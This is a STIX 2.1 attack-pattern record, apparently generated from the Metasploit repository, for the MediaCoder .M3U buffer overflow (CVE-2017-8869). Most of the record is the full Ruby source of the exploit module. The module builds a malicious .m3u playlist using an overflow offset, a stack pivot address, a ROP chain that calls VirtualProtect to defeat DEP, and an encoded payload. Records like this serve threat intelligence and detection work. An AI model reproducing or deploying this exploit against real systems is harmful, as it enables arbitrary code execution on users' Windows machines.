{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9989ef9b-20fc-493f-a955-44d7b0d14b85",
    "created": "2024-08-14T16:37:35.907095Z",
    "modified": "2024-08-14T16:37:35.907099Z",
    "name": "MediaCoder .M3U Buffer Overflow",
    "description": " This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability occurs when adding an .m3u, allowing arbitrary code execution under the context of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder runs with DEP. This module has been tested successfully on MediaCoder 0.8.21.5539 to 0.8.22.5530 over Windows XP SP3 and Windows 7 SP0.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mediacoder_m3u.rb",
            "external_id": "mediacoder_m3u.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8869"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MediaCoder .M3U Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability\n        occurs when adding an .m3u, allowing arbitrary code execution under the context\n        of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder\n        runs with DEP. This module has been tested successfully on MediaCoder 0.8.21.5539\n        to 0.8.22.5530 over Windows XP SP3 and Windows 7 SP0.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'metacom', # Vulnerability discovery and PoC\n          'modpr0be <modpr0be[at]spentera.com>', # Metasploit module\n          'otoy <otoy[at]spentera.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-8869' ],\n          [ 'OSVDB', '94522' ],\n          [ 'EDB', '26403' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'seh'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'           => 1200,\n          'BadChars'        => \"\\x00\\x5c\\x40\\x0d\\x0a\",\n          'DisableNops'     => true,\n          'StackAdjustment' => -3500\n        },\n      'Targets'        =>\n        [\n          [ 'MediaCoder 0.8.21 - 0.8.22 / Windows XP SP3 / Windows 7 SP0',\n            {\n              # stack pivot (add esp,7ac;pop pop pop pop ret from postproc-52.dll)\n              'Ret'\t\t=> 0x6afd4435,\n              'Offset'\t=> 849,\n              'Max'\t\t=> 5000\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u'])\n      ])\n\n  end\n\n  def junk(n=1)\n    return [rand_text_alpha(4).unpack(\"L\")[0]] * n\n  end\n\n  def nops(rop=false, n=1)\n    return rop ? [0x6ab16202] * n : [0x90909090] * n\n  end\n\n  def exploit\n    # fixed rop from mona.py :)\n    rop_gadgets =\n    [\n      nops(true,35),\t# ROP NOP\n      0x100482ff,\t# POP EAX # POP EBP # RETN [jpeg.dll]\n      0xffffffc0,\t# negate will become 0x00000040\n      junk,\n      0x66d9d9ba,\t# NEG EAX # RETN [avutil-52.dll]\n      0x6ab2241d,\t# XCHG EAX,EDX # ADD ESP,2C # POP EBP # POP EDI # POP ESI # POP EBX # RETN [swscale-2.dll]\n      junk(15),  \t# reserve more junk for add esp,2c\n      0x1004cc03,\t# POP ECX # RETN [jpeg.dll]\n      0x6ab561b0,\t# ptr to &VirtualProtect() [IAT swscale-2.dll]\n      0x66d9feee,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [avutil-52.dll]\n      0x6ab19780,\t# XCHG EAX,ESI # RETN [swscale-2.dll]\n      0x66d929f5,\t# POP EAX # POP EBX # RETN [jpeg.dll]\n      0xfffffcc0,\t# negate will become 0x0000033f\n      junk,\n      0x6ab3c65a,\t# NEG EAX # RETN [postproc-52.dll]\n      0x1004cc03,\t# POP ECX # RETN [jpeg.dll]\n      0xffffffff,\t#\n      0x660166e9,\t# INC ECX # SUB AL,0EB # RETN [libiconv-2.dll]\n      0x66d8ae48,\t# XCHG ECX,EBX # RETN [avutil-52.dll]\n      0x1005f6e4,\t# ADD EBX,EAX # OR EAX,3000000 # RETN [jpeg.dll]\n      0x6ab3d688,\t# POP ECX # RETN [jpeg.dll]\n      0x6ab4ead0,\t# Writable address [avutil-52.dll]\n      0x100444e3,\t# POP EDI # RETN [swscale-2.dll]\n      nops(true),\t# ROP NOP [swscale-2.dll]\n      0x100482ff,\t# POP EAX # POP EBP # RETN [jpeg.dll]\n      nops,      \t# Regular NOPs\n      0x6ab01c06,\t# PUSH ESP# RETN [swscale-2.dll]\n      0x6ab28dda,\t# PUSHAD # RETN [swscale-2.dll]\n    ].flatten.pack(\"V*\")\n\n    sploit = \"http://\"\n    sploit << rand_text(target['Offset'])\n    sploit << [target.ret].pack('V')\n    sploit << rop_gadgets\n    sploit << make_nops(16)\n    sploit << payload.encoded\n    sploit << rand_text(target['Max']-sploit.length)\n\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-24",
    "x_mitre_platforms": [
        "win'"
    ]
}